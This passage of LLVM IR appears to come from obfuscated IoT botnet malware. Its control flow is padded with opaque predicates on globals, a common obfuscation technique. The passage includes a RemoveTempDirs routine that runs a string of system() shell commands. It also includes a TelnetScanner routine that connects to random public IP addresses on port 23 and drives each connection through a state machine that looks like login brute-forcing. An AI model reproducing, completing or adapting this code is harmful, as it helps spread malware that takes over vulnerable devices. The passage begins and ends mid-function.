; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* @x.67
  %12 = load i32, i32* @y.68
  %13 = sub i32 %11, 1
  %14 = mul i32 %11, %13
  %15 = urem i32 %14, 2
  %16 = icmp eq i32 %15, 0
  %17 = icmp slt i32 %12, 10
  %18 = or i1 %16, %17
  br i1 %18, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %10
  %19 = load i32, i32* %2, align 4
  %20 = load i32, i32* @x.67
  %21 = load i32, i32* @y.68
  %22 = sub i32 %20, 1
  %23 = mul i32 %20, %22
  %24 = urem i32 %23, 2
  %25 = icmp eq i32 %24, 0
  %26 = icmp slt i32 %21, 10
  %27 = or i1 %25, %26
  br i1 %27, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %19

originalBBalteredBB:                              ; preds = %originalBB, %10
  %28 = load i32, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() #0 {
  %1 = call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.488, i32 0, i32 0))
  %2 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.489, i32 0, i32 0))
  %3 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.490, i32 0, i32 0))
  %4 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.491, i32 0, i32 0))
  %5 = call i32 @system(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.492, i32 0, i32 0))
  %6 = call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.493, i32 0, i32 0))
  %7 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.494, i32 0, i32 0))
  %8 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.495, i32 0, i32 0))
  %9 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.496, i32 0, i32 0))
  %10 = call i32 @system(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.497, i32 0, i32 0))
  %11 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.498, i32 0, i32 0))
  %12 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.499, i32 0, i32 0))
  %13 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.500, i32 0, i32 0))
  ret void
}

declare i32 @system(i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @TelnetScanner(i32, i32) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [128 x i8], align 16
  %11 = alloca i8, align 1
  %12 = alloca %struct.fd_set, align 8
  %13 = alloca %struct.timeval, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [256 x i8], align 16
  %17 = alloca i8*, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca [80 x i8], align 16
  %24 = alloca [80 x i8], align 16
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %25 = call i32 @getdtablesize() #5
  %26 = sub nsw i32 %25, 100
  store i32 %26, i32* %5, align 4
  %27 = load i32, i32* %5, align 4
  %28 = load i32, i32* %4, align 4
  %29 = icmp sgt i32 %27, %28
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %2
  %31 = load i32, i32* %4, align 4
  store i32 %31, i32* %5, align 4
  br label %32

; <label>:32:                                     ; preds = %30, %2
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %33, align 4
  %34 = call zeroext i16 @htons(i16 zeroext 23) #10
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %34, i16* %35, align 2
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %37 = getelementptr inbounds [8 x i8], [8 x i8]* %36, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %37, i8 0, i64 8, i32 4, i1 false)
  %38 = call noalias i8* @malloc(i64 1025) #5
  store i8* %38, i8** %17, align 8
  %39 = load i8*, i8** %17, align 8
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 1025, i32 1, i1 false)
  %40 = load i32, i32* %5, align 4
  %41 = zext i32 %40 to i64
  %42 = call i8* @llvm.stacksave()
  store i8* %42, i8** %19, align 8
  %43 = alloca %struct.telstate_t, i64 %41, align 16
  %44 = bitcast %struct.telstate_t* %43 to i8*
  %45 = load i32, i32* %5, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 5
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 %47, i32 16, i1 false)
  store i32 0, i32* %6, align 4
  br label %48

; <label>:48:                                     ; preds = %originalBBpart24, %32
  %49 = load i32, i32* %6, align 4
  %50 = load i32, i32* %5, align 4
  %51 = icmp slt i32 %49, %50
  br i1 %51, label %52, label %101

; <label>:52:                                     ; preds = %48
  %53 = load i32, i32* @x.71
  %54 = load i32, i32* @y.72
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %52
  %61 = load i32, i32* %6, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %62
  %64 = bitcast %struct.telstate_t* %63 to i8*
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 32, i32 16, i1 false)
  %65 = load i32, i32* %6, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %66
  %68 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %67, i32 0, i32 3
  store i8 1, i8* %68, align 1
  %69 = load i8*, i8** %17, align 8
  %70 = load i32, i32* %6, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %71
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %72, i32 0, i32 9
  store i8* %69, i8** %73, align 8
  %74 = load i32, i32* @x.71
  %75 = load i32, i32* @y.72
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %82

; <label>:82:                                     ; preds = %originalBBpart2
  %83 = load i32, i32* @x.71
  %84 = load i32, i32* @y.72
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %82
  %91 = load i32, i32* %6, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %6, align 4
  %93 = load i32, i32* @x.71
  %94 = load i32, i32* @y.72
  %95 = sub i32 %93, 1
  %96 = mul i32 %93, %95
  %97 = urem i32 %96, 2
  %98 = icmp eq i32 %97, 0
  %99 = icmp slt i32 %94, 10
  %100 = or i1 %98, %99
  br i1 %100, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %48

; <label>:101:                                    ; preds = %48
  br label %102

; <label>:102:                                    ; preds = %1413, %101
  %103 = load i32, i32* @x.71
  %104 = load i32, i32* @y.72
  %105 = sub i32 %103, 1
  %106 = mul i32 %103, %105
  %107 = urem i32 %106, 2
  %108 = icmp eq i32 %107, 0
  %109 = icmp slt i32 %104, 10
  %110 = or i1 %108, %109
  br i1 %110, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %102
  %111 = load i32, i32* @x.71
  %112 = load i32, i32* @y.72
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %119

; <label>:119:                                    ; preds = %originalBBpart28
  store i32 0, i32* %6, align 4
  br label %120

; <label>:120:                                    ; preds = %originalBBpart2186, %119
  %121 = load i32, i32* %6, align 4
  %122 = load i32, i32* %5, align 4
  %123 = icmp slt i32 %121, %122
  br i1 %123, label %124, label %1413

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %6, align 4
  %126 = sext i32 %125 to i64
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 7
  %129 = load i32, i32* %128, align 16
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %154

; <label>:131:                                    ; preds = %124
  %132 = load i32, i32* @x.71
  %133 = load i32, i32* @y.72
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %131
  %140 = call i64 @time(i64* null) #5
  %141 = trunc i64 %140 to i32
  %142 = load i32, i32* %6, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 7
  store i32 %141, i32* %145, align 16
  %146 = load i32, i32* @x.71
  %147 = load i32, i32* @y.72
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %154

; <label>:154:                                    ; preds = %originalBBpart212, %124
  %155 = load i32, i32* %6, align 4
  %156 = sext i32 %155 to i64
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %156
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %157, i32 0, i32 2
  %159 = load i8, i8* %158, align 8
  %160 = zext i8 %159 to i32
  switch i32 %160, label %1377 [
    i32 0, label %161
    i32 1, label %329
    i32 2, label %496
    i32 3, label %580
    i32 4, label %657
    i32 5, label %725
    i32 6, label %802
    i32 7, label %998
    i32 8, label %1144
  ]

; <label>:161:                                    ; preds = %154
  %162 = load i32, i32* %6, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %163
  %165 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %164, i32 0, i32 3
  %166 = load i8, i8* %165, align 1
  %167 = zext i8 %166 to i32
  %168 = icmp eq i32 %167, 1
  br i1 %168, label %169, label %189

; <label>:169:                                    ; preds = %161
  %170 = load i32, i32* %6, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %171
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %172, i32 0, i32 9
  %174 = load i8*, i8** %173, align 8
  store i8* %174, i8** %20, align 8
  %175 = load i32, i32* %6, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %176
  %178 = bitcast %struct.telstate_t* %177 to i8*
  call void @llvm.memset.p0i8.i64(i8* %178, i8 0, i64 32, i32 16, i1 false)
  %179 = load i8*, i8** %20, align 8
  %180 = load i32, i32* %6, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 9
  store i8* %179, i8** %183, align 8
  %184 = call i32 @getRandomPublicIP()
  %185 = load i32, i32* %6, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 1
  store i32 %184, i32* %188, align 4
  br label %269

; <label>:189:                                    ; preds = %161
  %190 = load i32, i32* %6, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %191
  %193 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %192, i32 0, i32 3
  %194 = load i8, i8* %193, align 1
  %195 = zext i8 %194 to i32
  %196 = icmp eq i32 %195, 0
  br i1 %196, label %197, label %252

; <label>:197:                                    ; preds = %189
  %198 = load i32, i32* %6, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 4
  %202 = load i8, i8* %201, align 2
  %203 = add i8 %202, 1
  store i8 %203, i8* %201, align 2
  %204 = load i32, i32* %6, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 5
  %208 = load i8, i8* %207, align 1
  %209 = add i8 %208, 1
  store i8 %209, i8* %207, align 1
  %210 = load i32, i32* %6, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %211
  %213 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %212, i32 0, i32 5
  %214 = load i8, i8* %213, align 1
  %215 = zext i8 %214 to i64
  %216 = icmp eq i64 %215, 35
  br i1 %216, label %217, label %222

; <label>:217:                                    ; preds = %197
  %218 = load i32, i32* %6, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %219
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %220, i32 0, i32 3
  store i8 1, i8* %221, align 1
  br label %1394

; <label>:222:                                    ; preds = %197
  %223 = load i32, i32* %6, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 4
  %227 = load i8, i8* %226, align 2
  %228 = zext i8 %227 to i64
  %229 = icmp eq i64 %228, 35
  br i1 %229, label %230, label %235

; <label>:230:                                    ; preds = %222
  %231 = load i32, i32* %6, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 3
  store i8 1, i8* %234, align 1
  br label %1394

; <label>:235:                                    ; preds = %222
  %236 = load i32, i32* @x.71
  %237 = load i32, i32* @y.72
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %235
  %244 = load i32, i32* @x.71
  %245 = load i32, i32* @y.72
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %252

; <label>:252:                                    ; preds = %originalBBpart216, %189
  %253 = load i32, i32* @x.71
  %254 = load i32, i32* @y.72
  %255 = sub i32 %253, 1
  %256 = mul i32 %253, %255
  %257 = urem i32 %256, 2
  %258 = icmp eq i32 %257, 0
  %259 = icmp slt i32 %254, 10
  %260 = or i1 %258, %259
  br i1 %260, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %252
  %261 = load i32, i32* @x.71
  %262 = load i32, i32* @y.72
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %269

; <label>:269:                                    ; preds = %originalBBpart220, %169
  %270 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %270, align 4
  %271 = call zeroext i16 @htons(i16 zeroext 23) #10
  %272 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %271, i16* %272, align 2
  %273 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %274 = getelementptr inbounds [8 x i8], [8 x i8]* %273, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %274, i8 0, i64 8, i32 4, i1 false)
  %275 = load i32, i32* %6, align 4
  %276 = sext i32 %275 to i64
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 1
  %279 = load i32, i32* %278, align 4
  %280 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %281 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %280, i32 0, i32 0
  store i32 %279, i32* %281, align 4
  %282 = call i32 @socket(i32 2, i32 1, i32 0) #5
  %283 = load i32, i32* %6, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %284
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %285, i32 0, i32 0
  store i32 %282, i32* %286, align 16
  %287 = load i32, i32* %6, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 16
  %292 = icmp eq i32 %291, -1
  br i1 %292, label %293, label %294

; <label>:293:                                    ; preds = %269
  br label %1394

; <label>:294:                                    ; preds = %269
  %295 = load i32, i32* %6, align 4
  %296 = sext i32 %295 to i64
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %296
  %298 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %297, i32 0, i32 0
  %299 = load i32, i32* %298, align 16
  %300 = load i32, i32* %6, align 4
  %301 = sext i32 %300 to i64
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %301
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %302, i32 0, i32 0
  %304 = load i32, i32* %303, align 16
  %305 = call i32 (i32, i32, ...) @fcntl(i32 %304, i32 3, i8* null)
  %306 = or i32 %305, 2048
  %307 = call i32 (i32, i32, ...) @fcntl(i32 %299, i32 4, i32 %306)
  %308 = load i32, i32* %6, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %314 = call i32 @connect(i32 %312, %struct.sockaddr* %313, i32 16)
  %315 = icmp eq i32 %314, -1
  br i1 %315, label %316, label %324

; <label>:316:                                    ; preds = %294
  %317 = call i32* @__errno_location() #10
  %318 = load i32, i32* %317, align 4
  %319 = icmp ne i32 %318, 115
  br i1 %319, label %320, label %324

; <label>:320:                                    ; preds = %316
  %321 = load i32, i32* %6, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %322
  call void @reset_telstate(%struct.telstate_t* %323)
  br label %328

; <label>:324:                                    ; preds = %316, %294
  %325 = load i32, i32* %6, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %326
  call void @advance_telstate(%struct.telstate_t* %327, i32 1)
  br label %328

; <label>:328:                                    ; preds = %324, %320
  br label %1377

; <label>:329:                                    ; preds = %154
  br label %330

; <label>:330:                                    ; preds = %329
  %331 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %332 = getelementptr inbounds [16 x i64], [16 x i64]* %331, i64 0, i64 0
  %333 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %332) #5, !srcloc !5
  %334 = extractvalue { i64, i64* } %333, 0
  %335 = extractvalue { i64, i64* } %333, 1
  %336 = trunc i64 %334 to i32
  store i32 %336, i32* %21, align 4
  %337 = ptrtoint i64* %335 to i64
  %338 = trunc i64 %337 to i32
  store i32 %338, i32* %22, align 4
  br label %339

; <label>:339:                                    ; preds = %330
  %340 = load i32, i32* @x.71
  %341 = load i32, i32* @y.72
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %339
  %348 = load i32, i32* @x.71
  %349 = load i32, i32* @y.72
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %356

; <label>:356:                                    ; preds = %originalBBpart224
  %357 = load i32, i32* @x.71
  %358 = load i32, i32* @y.72
  %359 = sub i32 %357, 1
  %360 = mul i32 %357, %359
  %361 = urem i32 %360, 2
  %362 = icmp eq i32 %361, 0
  %363 = icmp slt i32 %358, 10
  %364 = or i1 %362, %363
  br i1 %364, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %356
  %365 = load i32, i32* %6, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 0
  %369 = load i32, i32* %368, align 16
  %370 = srem i32 %369, 64
  %371 = zext i32 %370 to i64
  %372 = shl i64 1, %371
  %373 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %374 = load i32, i32* %6, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %375
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %376, i32 0, i32 0
  %378 = load i32, i32* %377, align 16
  %379 = sdiv i32 %378, 64
  %380 = sext i32 %379 to i64
  %381 = getelementptr inbounds [16 x i64], [16 x i64]* %373, i64 0, i64 %380
  %382 = load i64, i64* %381, align 8
  %383 = or i64 %382, %372
  store i64 %383, i64* %381, align 8
  %384 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %384, align 8
  %385 = load i32, i32* %3, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %386, i64* %387, align 8
  %388 = load i32, i32* %6, align 4
  %389 = sext i32 %388 to i64
  %390 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %389
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %390, i32 0, i32 0
  %392 = load i32, i32* %391, align 16
  %393 = add nsw i32 %392, 1
  %394 = call i32 @select(i32 %393, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %394, i32* %7, align 4
  %395 = load i32, i32* %7, align 4
  %396 = icmp eq i32 %395, 1
  %397 = load i32, i32* @x.71
  %398 = load i32, i32* @y.72
  %399 = sub i32 %397, 1
  %400 = mul i32 %397, %399
  %401 = urem i32 %400, 2
  %402 = icmp eq i32 %401, 0
  %403 = icmp slt i32 %398, 10
  %404 = or i1 %402, %403
  br i1 %404, label %originalBBpart273, label %originalBB26alteredBB

originalBBpart273:                                ; preds = %originalBB26
  br i1 %396, label %405, label %457

; <label>:405:                                    ; preds = %originalBBpart273
  %406 = load i32, i32* @x.71
  %407 = load i32, i32* @y.72
  %408 = sub i32 %406, 1
  %409 = mul i32 %406, %408
  %410 = urem i32 %409, 2
  %411 = icmp eq i32 %410, 0
  %412 = icmp slt i32 %407, 10
  %413 = or i1 %411, %412
  br i1 %413, label %originalBB75, label %originalBB75alteredBB

originalBB75:                                     ; preds = %originalBB75alteredBB, %405
  %414 = load i32, i32* %6, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %415
  %417 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %416, i32 0, i32 7
  store i32 0, i32* %417, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %418 = load i32, i32* %6, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %419
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %420, i32 0, i32 0
  %422 = load i32, i32* %421, align 16
  %423 = bitcast i32* %15 to i8*
  %424 = call i32 @getsockopt(i32 %422, i32 1, i32 4, i8* %423, i32* %14) #5
  %425 = load i32, i32* %15, align 4
  %426 = icmp ne i32 %425, 0
  %427 = load i32, i32* @x.71
  %428 = load i32, i32* @y.72
  %429 = sub i32 %427, 1
  %430 = mul i32 %427, %429
  %431 = urem i32 %430, 2
  %432 = icmp eq i32 %431, 0
  %433 = icmp slt i32 %428, 10
  %434 = or i1 %432, %433
  br i1 %434, label %originalBBpart277, label %originalBB75alteredBB

originalBBpart277:                                ; preds = %originalBB75
  br i1 %426, label %435, label %439

; <label>:435:                                    ; preds = %originalBBpart277
  %436 = load i32, i32* %6, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %437
  call void @reset_telstate(%struct.telstate_t* %438)
  br label %456

; <label>:439:                                    ; preds = %originalBBpart277
  %440 = load i32, i32* %6, align 4
  %441 = sext i32 %440 to i64
  %442 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %441
  %443 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %442, i32 0, i32 0
  %444 = load i32, i32* %443, align 16
  %445 = load i32, i32* %6, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %446
  %448 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %447, i32 0, i32 0
  %449 = load i32, i32* %448, align 16
  %450 = call i32 (i32, i32, ...) @fcntl(i32 %449, i32 3, i8* null)
  %451 = and i32 %450, -2049
  %452 = call i32 (i32, i32, ...) @fcntl(i32 %444, i32 4, i32 %451)
  %453 = load i32, i32* %6, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %43, i64 %454
  call void @advance_telstate(%struct.telstate_t* %455, i32 2)
  br label %456

; <label>:456:                                    ; preds = %439, %435
  br label %1394

; <label>:457:                                    ; preds = %originalBBpart273
  %458 = load i32, i32* @x.71
  %459 = load i32, i32* @y.72
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBB79, label %originalBB79alteredBB

originalBB79:                                     ; preds = %originalBB79alteredBB, %457
  %466 = load i32, i32* %7, align 4
  %467 = icmp eq i32 %466, -1
  %468 = load i32, i32* @x.71
  %469 = load i32, i32* @y.72
  %470 = sub i32 %468, 1
  %471 = mul i32 %468, %470
  %472 = urem i32 %471, 2
  %473 = icmp eq i32 %472, 0
  %474 = icmp slt i32 %469, 10
  %475 = or i1 %473, %474
  br i1 %475, label %originalBBpart281, label %originalBB79alteredBB

